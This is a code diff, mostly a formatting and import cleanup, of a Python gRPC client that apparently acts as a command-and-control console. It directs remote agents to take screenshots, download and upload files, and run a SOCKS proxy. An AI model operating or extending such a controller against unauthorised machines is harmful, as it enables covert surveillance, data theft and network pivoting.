@@ -5,8 +5,8 @@ from typing import Union
 
 import grpc
 
-import cmds_pb2
-import cmds_pb2_grpc
+from protos.cmds import cmds_pb2
+from protos.cmds import cmds_pb2_grpc
 
 _PRODUCTS_DIR_PATH = Path(__file__).parent / "products"
 
@@ -30,25 +30,28 @@ class Agent:
         req = cmds_pb2.ScreenshotRequest(agent_id=self.id)
         resp = self._stub.Screenshot(req)
         output_path = local_path_to_save or Path(
-            _PRODUCTS_DIR_PATH, f'screenshot_agent_{self.id}_{datetime.now().isoformat()}.png')
-        with open(output_path, 'wb') as screenshot_file:
+            _PRODUCTS_DIR_PATH,
+            f"screenshot_agent_{self.id}_{datetime.now().isoformat()}.png",
+        )
+        with open(output_path, "wb") as screenshot_file:
             screenshot_file.write(resp.data)
-        print(f'[*] Saved screenshot to {output_path}')
+        print(f"[*] Saved screenshot to {output_path}")
 
-    def download_file(self, remote_path: str, local_path: str = None) -> Union[bytes, None]:
+    def download_file(
+        self, remote_path: str, local_path: str = None
+    ) -> Union[bytes, None]:
         req = cmds_pb2.DownloadFileRequest(agent_id=self.id, path=remote_path)
         resp = self._stub.DownloadFile(req)
         if local_path:
-            with open(local_path, 'wb') as downloaded_file:
+            with open(local_path, "wb") as downloaded_file:
                 downloaded_file.write(resp.data)
         else:
             return resp.data
 
     def upload_file(self, local_path: str, remote_path: str) -> None:
-        with open(local_path, 'rb') as uploaded_file:
+        with open(local_path, "rb") as uploaded_file:
             data = uploaded_file.read()
-        req = cmds_pb2.UploadFileRequest(
-            agent_id=self.id, path=remote_path, data=data)
+        req = cmds_pb2.UploadFileRequest(agent_id=self.id, path=remote_path, data=data)
         self._stub.UploadFile(req)
 
     def start_socks_server(self) -> str:
@@ -61,7 +64,7 @@ class Agent:
         resp = self._stub.StopSocksServer(req)
 
     def __repr__(self) -> str:
-        return f'Agent(id={self.id})'
+        return f"Agent(id={self.id})"
 
 
 @dataclass
@@ -71,8 +74,8 @@ class ControllerClient:
 
     MAX_MSG_LEN = 100 * 1024 * 1024
     CHANNEL_OPTS = [
-        ('grpc.max_send_message_length', MAX_MSG_LEN),
-        ('grpc.max_receive_message_length', MAX_MSG_LEN),
+        ("grpc.max_send_message_length", MAX_MSG_LEN),
+        ("grpc.max_receive_message_length", MAX_MSG_LEN),
     ]
 
     def connect(self) -> None:
@@ -86,6 +89,6 @@ class ControllerClient:
         return self._stub.GetAgents(cmds_pb2.GetAgentsRequest(alive_only=alive_only))
 
 
-if __name__ == '__main__':
-    cnc = ControllerClient('localhost:8159')
+if __name__ == "__main__":
+    cnc = ControllerClient("localhost:8159")
     cnc.connect()
